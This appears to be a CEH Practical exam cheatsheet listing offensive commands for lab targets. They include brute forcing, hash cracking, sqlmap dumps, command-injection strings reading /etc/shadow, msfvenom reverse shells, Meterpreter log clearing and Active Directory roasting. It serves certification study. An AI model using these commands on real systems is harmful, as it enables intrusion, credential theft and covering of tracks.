# CEH Practical Exam Cheatsheet  
> Open this during the exam. Organized by task type.  
  
---  
  
## EXAM INFO  
- **14/20 to pass (70%)**, 6 hours + 15min break  
- **3 subnets** to scan (IPs vary per exam, examples below)  
- **Open book, open internet** — notes + Google allowed  
- Parrot OS + Windows 11 provided, tools pre-installed  
- NO phone, NO dual monitor, NO installing extra tools  
  
## FIRST THING: Run These Immediately  
```  
# From Parrot (root terminal) - let these run in background  
# SCAN ALL 3 SUBNETS - exact IPs shown at exam start  
sudo nmap -sS -sV -O -p- -oA scan1 10.10.55.0/24 &  
nmap -sS -sV -O -p- -oA scan2 192.168.44.0/24 &  
nmap -sS -sV -O -p- -oA scan3 192.168.200.0/24 &  
  
# Quick host discovery while full scans run  
nmap -sn 10.10.55.0/24  
nmap -sn 192.168.44.0/24  
nmap -sn 192.168.200.0/24  
  
# Also run Zenmap on Windows 11 with same subnets (GUI, easy to browse results)  
```  
> **NOTE:** Subnet IPs vary per exam. Replace with actual IPs shown in your exam.  
> Skip .1 and .2 addresses (gateways).  
  
---  
  
## 1. NMAP — Scanning & Enumeration  
  
### Host Discovery  
```  
nmap -sn 10.10.1.0/24                    # how many hosts alive  
nmap -sn -PR 10.10.1.0/24                # ARP ping (LAN only)  
```  
  
### Port & Service Scan  
```  
nmap -sS -sV -p- [ip]                    # all ports + versions  
nmap -sT -v [ip]                         # TCP connect scan  
nmap -sU -p 53,161,137 [ip]              # UDP scan (DNS, SNMP, NetBIOS)  
nmap -A [ip]                             # aggressive (OS + version + scripts + traceroute)  
```  
  
### OS Detection  
```  
nmap -O [ip]                             # OS fingerprint  
nmap --script smb-os-discovery -p 445 [ip]  # OS via SMB  
```  
  
### SMB Enumeration  
```  
nmap --script smb-enum-shares -p 445 [ip]   # list shares  
nmap --script smb-enum-users -p 445 [ip]    # list users  
nmap --script smb-vuln* -p 445 [ip]         # SMB vulnerabilities  
```  
  
### NSE Scripts  
```  
nmap -sC [ip]                            # default scripts  
nmap --script vuln [ip]                  # all vuln scripts  
nmap --script http-enum [ip]             # web directory enum  
nmap --script banner [ip]                # grab banners  
```  
  
### Output  
```  
nmap -oN out.txt [ip]                    # text  
nmap -oX out.xml [ip]                    # XML (for Metasploit)  
nmap -oA out [ip]                        # all formats  
```  
  
---  
  
## 2. PASSWORD CRACKING  
  
### Hydra — Online Brute Force  
```  
hydra -l admin -P /usr/share/wordlists/rockyou.txt [ip] ftp  
hydra -l admin -P /usr/share/wordlists/rockyou.txt [ip] ssh  
hydra -l admin -P /usr/share/wordlists/rockyou.txt [ip] rdp  
hydra -l admin -P /usr/share/wordlists/rockyou.txt [ip] smb  
hydra -l admin -P rockyou.txt [ip] http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"  
```  
  
### Hashcat — Offline Hash Cracking  
```  
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt      # MD5  
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt    # SHA-1  
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt   # NTLM  
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt   # sha512crypt  
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt   # bcrypt  
```  
  
### John the Ripper  
```  
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  
john --show hash.txt                     # show cracked  
john --format=NT hash.txt                # specify format  
```  
  
### Hash Identification  
```  
hash-identifier                          # paste hash, it tells you type  
hashid [hash]                            # alternative  
```  
  
| Hash starts with | Type |  
|------------------|------|  
| $1$ | MD5crypt |  
| $5$ | SHA-256crypt |  
| $6$ | SHA-512crypt |  
| $2a$ / $2b$ | bcrypt |  
| 32 hex chars | MD5 or NTLM |  
| 40 hex chars | SHA-1 |  
| 64 hex chars | SHA-256 |  
  
### ophcrack (Windows rainbow tables)  
GUI tool — load SAM hive → Tables → select rainbow tables → Crack  
  
---  
  
## 3. SQL INJECTION — SQLMap  
  
### Basic Usage  
```  
sqlmap -u "http://[ip]/page?id=1" --dbs                    # list databases  
sqlmap -u "http://[ip]/page?id=1" -D [dbname] --tables     # list tables  
sqlmap -u "http://[ip]/page?id=1" -D [db] -T [table] --columns   # list columns  
sqlmap -u "http://[ip]/page?id=1" -D [db] -T [table] --dump      # dump data  
sqlmap -u "http://[ip]/page?id=1" --dump-all               # dump everything  
```  
  
### With POST data  
```  
sqlmap -u "http://[ip]/login" --data="user=admin&pass=test" --dbs  
```  
  
### With cookie  
```  
sqlmap -u "http://[ip]/page?id=1" --cookie="PHPSESSID=abc123" --dbs  
```  
  
### Manual SQLi Test Strings  
```  
' OR 1=1 --  
' OR '1'='1  
" OR ""="  
' UNION SELECT NULL,NULL,NULL --  
' UNION SELECT username,password FROM users --  
```  
  
---  
  
## 4. WEB APPLICATION ATTACKS  
  
### WPScan (WordPress)  
```  
wpscan --url http://[ip] --enumerate u          # enumerate users  
wpscan --url http://[ip] --enumerate vp         # vulnerable plugins  
wpscan --url http://[ip] --enumerate vt         # vulnerable themes  
wpscan --url http://[ip] -U admin -P rockyou.txt  # brute force login  
```  
  
### Nikto (Web Server Scanner)  
```  
nikto -h http://[ip]                     # basic scan  
nikto -h http://[ip] -p 8080            # custom port  
nikto -h http://[ip] -ssl               # HTTPS  
```  
  
### Directory Busting  
```  
dirb http://[ip]                         # default wordlist  
gobuster dir -u http://[ip] -w /usr/share/wordlists/dirb/common.txt  
```  
  
### Command Injection  
```  
; ls  
| cat /etc/passwd  
&& whoami  
; cat /etc/shadow  
| net user  
```  
  
---  
  
## 5. WIRESHARK — Packet Analysis  
  
### Common Filters  
```  
ip.addr == 10.10.1.5                     # traffic to/from IP  
tcp.port == 80                           # HTTP traffic  
http                                     # all HTTP  
http.request.method == "POST"            # POST requests (credentials)  
ftp                                      # FTP traffic  
ftp.request.command == "PASS"            # FTP passwords  
tcp.flags.syn == 1 && tcp.flags.ack == 0 # SYN packets (scan detection)  
dns                                      # DNS queries  
smtp                                     # email traffic  
```  
  
### Extract Credentials  
Follow TCP Stream: right-click packet → Follow → TCP Stream  
  
### Detect Scans  
- Many SYN packets from one IP = port scan  
- Many IPs contacted = host sweep  
  
---  
  
## 6. STEGANOGRAPHY  
  
### Steghide (JPEG)  
```  
steghide extract -sf image.jpg -p password     # extract hidden data  
steghide info image.jpg                        # check if data embedded  
steghide embed -cf image.jpg -ef secret.txt -p password  # hide data  
```  
  
### OpenStego (GUI)  
Extract Data → select stego image → enter password → extract  
  
### Snow (whitespace steganography)  
```  
snow -C -p "password" stego.txt                # extract  
snow -C -m "secret" -p "password" in.txt out.txt  # hide  
```  
  
### Detect Hidden Data  
```  
binwalk image.jpg                              # detect embedded files  
binwalk -e image.jpg                           # extract  
strings image.jpg | less                       # readable strings  
exiftool image.jpg                             # metadata  
```  
  
---  
  
## 7. CRYPTOGRAPHY  
  
### VeraCrypt  
GUI: Select volume → Mount → enter password → browse files  
CLI: `veracrypt --mount /path/to/volume /mnt/veracrypt`  
  
### Hash a File  
```  
md5sum file.txt                          # MD5  
sha1sum file.txt                         # SHA-1  
sha256sum file.txt                       # SHA-256  
```  
  
### Compare Hashes (find tampered file)  
```  
md5sum file1 file2 file3                 # compare outputs  
# different hash = tampered file  
```  
  
### CryptTool / Advanced Encryption Package  
Windows GUI — open encrypted file → enter key/password → decrypt  
  
---  
  
## 8. METASPLOIT  
  
### Basic Workflow  
```  
msfconsole  
search [keyword]                         # find modules  
use [module]  
show options  
set RHOSTS [target ip]  
set LHOST [your ip]  
exploit  
```  
  
### Common Modules  
```  
exploit/windows/smb/ms17_010_eternalblue    # EternalBlue  
exploit/windows/smb/psexec                  # pass the hash  
exploit/multi/handler                       # catch reverse shell  
auxiliary/scanner/smb/smb_version           # SMB version  
auxiliary/scanner/portscan/syn              # SYN scan  
```  
  
### Meterpreter Commands  
```  
getuid                                   # current user  
getsystem                                # try privesc  
hashdump                                 # dump password hashes  
download [file]                          # download file  
upload [file]                            # upload file  
shell                                    # drop to system shell  
clearev                                  # clear event logs  
run post/multi/recon/local_exploit_suggester  # find privesc  
```  
  
### msfvenom Payloads  
```  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=4444 -f exe > shell.exe  
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[ip] LPORT=4444 -f elf > shell.elf  
```  
  
---  
  
## 9. MOBILE — PhoneSploit (ADB)  
  
```  
phonesploit                              # launch  
# or manually:  
adb connect [ip]:5555                    # connect to Android device  
adb devices                              # verify connection  
adb shell                                # get shell  
adb pull /sdcard/filename .              # download file  
adb shell ls /sdcard/                    # list files  
```  
  
---  
  
## 10. MALWARE ANALYSIS — Detect It Easy (DIE)  
  
Open file in DIE GUI:  
- **Entropy** tab → note entropy value (question will ask for this)  
- **Strings** tab → look for suspicious strings  
- **Packer** detection → identify if packed (UPX, etc.)  
- File type, compiler, linker info  
  
---  
  
## 11. VULNERABILITY SCANNING — OpenVAS/GreenBone  
  
```  
gvm-start                               # start OpenVAS  
```  
Access: https://localhost:9392  
1. Scans → Tasks → New Task  
2. Set target IP  
3. Scan config: Full and Fast  
4. Start → wait for results  
5. Find CVSS score for specific CVE in results  
  
---  
  
## 12. ENUMERATION QUICK REFERENCE  
  
### NetBIOS/SMB  
```  
enum4linux -a [ip]                       # full enumeration  
nbtstat -a [ip]                          # Windows NetBIOS  
net use \\[ip]\IPC$ "" /u:""             # null session  
```  
  
### SNMP  
```  
snmpwalk -v2c -c public [ip]             # walk SNMP tree  
snmpwalk -v1 -c public [ip] | grep STRING  # readable strings  
```  
  
### LDAP  
```  
ldapsearch -x -h [ip] -b "dc=target,dc=com"   # dump LDAP  
nmap -p 389 --script ldap-search [ip]  
```  
  
### NFS  
```  
showmount -e [ip]                        # show exports  
mount -t nfs [ip]:/share /tmp/nfs        # mount share  
```  
  
### SMTP  
```  
smtp-user-enum -M VRFY -U users.txt -t [ip]   # enumerate users  
```  
  
---  
  
## 13. ACTIVE DIRECTORY ATTACKS (NEW in v13)  
  
### Identify Domain Controller  
Port 88 (Kerberos) + Port 389 (LDAP) = **Domain Controller**  
```  
nmap -p 88,389,445 10.10.55.0/24            # find the DC fast  
nmap -A -sC -sV [DC-ip]                     # detailed DC scan, get domain name  
```  
  
### AS-REP Roasting (users without pre-auth)  
```  
cd /root/impacket/examples  
python3 GetNPUsers.py [DOMAIN]/ -no-pass -usersfile users.txt -dc-ip [DC-ip]  
```  
- Finds users with DONT_REQ_PREAUTH set  
- Dumps their hash → crack with john/hashcat  
  
### Crack Kerberos Hashes  
```  
john --wordlist=/usr/share/wordlists/rockyou.txt kerbhash.txt  
hashcat -m 18200 kerbhash.txt rockyou.txt    # AS-REP hash (mode 18200)  
hashcat -m 13100 kerbhash.txt rockyou.txt    # Kerberoast TGS hash (mode 13100)  
```  
  
### Password Spraying with CrackMapExec  
```  
cme rdp [subnet]/24 -u users.txt -p "cracked_password"  
cme smb [subnet]/24 -u users.txt -p "cracked_password"  
cme ssh [subnet]/24 -u users.txt -p "cracked_password"  
```  
Find which other users/machines use the same password.  
  
### Kerberoasting (need domain user creds first)  
```  
# From compromised Windows machine:  
rubeus.exe kerberoast /outfile:hash.txt  
  
# Or from Parrot with impacket:  
python3 GetUserSPNs.py [DOMAIN]/[user]:[password] -dc-ip [DC-ip] -outputfile hash.txt  
```  
Then crack with `hashcat -m 13100 hash.txt rockyou.txt`  
  
### MSSQL Attack (port 1433)  
```  
hydra -l [user] -P rockyou.txt [ip] mssql                    # brute force  
python3 mssqlclient.py [DOMAIN]/[user]:[pass]@[ip] -port 1433  # connect  
# In SQL shell:  
SELECT name FROM sys.databases;                                # list databases  
# If xp_cmdshell enabled → Metasploit:  
use exploit/windows/mssql/mssql_payload  
set RHOST [ip]  
set USERNAME [user]  
set PASSWORD [pass]  
exploit  
```  
  
### Responder (LLMNR Poisoning)  
```  
responder -I eth0 -wrf                      # capture NTLMv2 hashes on LAN  
# Then crack with:  
hashcat -m 5600 hash.txt rockyou.txt         # NTLMv2  
```  
  
### AD Quick Decision Tree  
```  
Port 88+389 found?  
├── YES → it's the DC  
│   ├── Get domain name from nmap -A scan  
│   ├── AS-REP Roast → GetNPUsers.py → crack hash  
│   ├── Got user creds? → Kerberoast → crack TGS hash  
│   └── Password spray cracked passwords across subnet  
└── Port 1433 found?  
    ├── Hydra brute force MSSQL  
    └── mssqlclient.py → xp_cmdshell → Metasploit  
```  
  
---  
  
## COMMON PORTS  
| Port | Service | Port | Service |  
|------|---------|------|---------|  
| 21 | FTP | 88 | Kerberos (=DC) |  
| 22 | SSH | 389 | LDAP |  
| 23 | Telnet | 445 | SMB |  
| 25 | SMTP | 443 | HTTPS |  
| 53 | DNS | 1433 | MSSQL |  
| 53 | DNS | 1521 | Oracle |  
| 80 | HTTP | 2049 | NFS |  
| 110 | POP3 | 3306 | MySQL |  
| 135 | MSRPC | 3389 | RDP |  
| 137-139 | NetBIOS | 5432 | PostgreSQL |  
| 143 | IMAP | 5555 | ADB |  
| 161 | SNMP | 5900 | VNC |  
  
---  
  
## TTL → OS Identification  
| TTL | OS |  
|-----|-----|  
| 64 | Linux |  
| 128 | Windows |  
| 255 | Cisco/Solaris |  
